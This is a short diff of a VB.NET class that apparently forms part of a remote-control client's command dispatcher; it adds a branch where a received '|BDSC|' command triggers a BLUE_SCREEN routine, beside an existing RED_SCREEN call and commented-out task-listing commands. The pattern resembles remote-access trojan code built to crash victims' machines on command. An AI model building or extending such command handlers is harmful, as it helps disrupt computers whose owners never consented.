@@ -8,7 +8,9 @@ Public Class MainCL
 
             Await Task.Run(Sub() V1.RED_SCREEN())
 
+        ElseIf h(1) = "|BDSC|" Then
 
+            Await Task.Run(Sub() V1_Blue.BLUE_SCREEN())
             '   ElseIf h(1) = "|GETTASKSNOTOLD|" Then
 
             '   Await Task.Run(Sub() TasksGot(k, "|OLD|"))
